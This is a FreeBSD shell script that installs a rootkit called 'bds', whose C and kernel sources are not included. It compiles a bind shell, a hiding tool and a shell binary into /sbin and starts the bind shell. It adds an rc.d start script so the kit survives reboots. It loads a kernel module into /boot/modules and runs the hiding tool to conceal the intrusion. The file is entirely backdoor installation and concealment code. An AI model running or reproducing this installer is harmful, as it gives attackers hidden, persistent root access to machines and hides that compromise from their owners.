#!/bin/sh

command="pwd"
HOME_DIR=$($command)
if [ "$(id -u)" -ne 0 ]; then echo "Please run as root." >&2; exit 1; fi

install_gcc() {
	pkg install gcc
}

install_elf() {
	echo "[+] installing elf"
	cd $HOME_DIR
	cd userspace
	gcc -o /sbin/bds_bindshell bds_bindshell.c		
	gcc -o /sbin/bds_hide bds_hide.c		
	gcc -o /sbin/bds_shell bds_shell.c	
	cd /;/sbin/bds_bindshell
	echo "[+] done elf installer"	
}

install_rc() {
	echo "[+] installing rc"
	cd $HOME_DIR
	cp bds_start.sh /usr/local/etc/rc.d
	chmod -R 755 /usr/local/etc/rc.d/bds_start.sh
	echo "[+] done rc installer"
}

install_kld() {
	echo "[+] installing kld"
	cd $HOME_DIR
	cd kernelspace
	make
	mv bds_kld.ko  /boot/modules/
	kldload /boot/modules/bds_kld.ko
	sleep 3
	/sbin/bds_hide
	echo "[-] done kld installer"
}	



install_gcc
install_elf
install_rc
install_kld
echo "[+] installation finished"


